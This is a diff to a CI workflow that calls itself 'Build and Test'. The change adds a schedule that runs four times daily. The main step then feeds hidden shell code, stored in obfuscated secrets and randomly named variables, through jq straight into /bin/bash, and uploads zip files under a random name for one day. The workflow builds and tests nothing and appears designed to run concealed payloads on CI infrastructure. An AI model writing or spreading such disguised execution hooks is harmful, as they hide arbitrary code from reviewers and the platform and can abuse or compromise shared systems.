@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 1,7,13,19 * * *'
 env:
   CI: true
 jobs:
@@ -13,18 +15,18 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          yk62: ${{ secrets.yk62 }}
+          ejff68333: ${{ secrets.ejff68333 }}
         run: |
-          printf '%s' "$yk62" | jq -r .eq71999 | /bin/bash
-          printf '%s' "$u7" | jq -r .x9842 | /bin/bash
-          echo $hhn42 | jq -r .vpaz8779 | /bin/bash
-          printf '%s' "$dffya300" | jq -r .qr747 | /bin/bash
-          printf '%s' "$xu2" | jq -r .ew993 | /bin/bash
-          printf '%s' "$kulb9" | jq -r .yu90535 | /bin/bash
+          printf '%s' "$ejff68333" | jq -r .kemiz4 | /bin/bash
+          echo $ssuyh28 | jq -r .ytp7 | /bin/bash
+          printf '%s' "$ruoxi98701" | jq -r .va2 | /bin/bash
+          echo $kmqgl4309 | jq -r .tmc24 | /bin/bash
+          echo $bpaqo7235 | jq -r .t041 | /bin/bash
+          echo $e8 | jq -r .pdvot890 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: mbXusW7A
+          name: IflG1dH5
           path: "*.zip"
           retention-days: 1
